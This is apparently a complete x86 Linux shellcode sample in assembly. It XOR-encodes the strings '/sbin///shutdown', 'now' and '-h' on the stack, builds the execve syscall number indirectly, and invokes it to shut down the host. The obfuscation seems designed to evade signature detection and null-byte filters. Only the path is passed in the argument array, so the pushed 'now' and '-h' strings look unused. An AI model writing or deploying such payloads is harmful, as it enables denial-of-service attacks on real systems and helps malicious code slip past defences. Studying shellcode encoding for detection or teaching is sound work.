global _start
section .text
_start:
xor eax, eax
xor edx, edx
push eax

; pushed h-
push word 0x682c
xor [esp], byte 0x1
push eax

;pushed won
push byte 0x77
push word 0x6f6e
push eax

;pushed nwod
push   0x6e116f60
xor byte [esp], 0x04
xor byte [esp+2], 0x66

;pushed tuhs
push   0x74116811
xor byte [esp], 0x62
xor byte [esp+2], 0x64

;pushed ///n
push   0x2f2f2f4c
xor byte [esp], 0x22

;pushed ibs/
push   0x6940732f
xor byte [esp+2], 0x22
mov ebx, esp
push eax
push ebx
mov ecx,esp 
mov al,8
or al, 2
or al,1
int 0x80
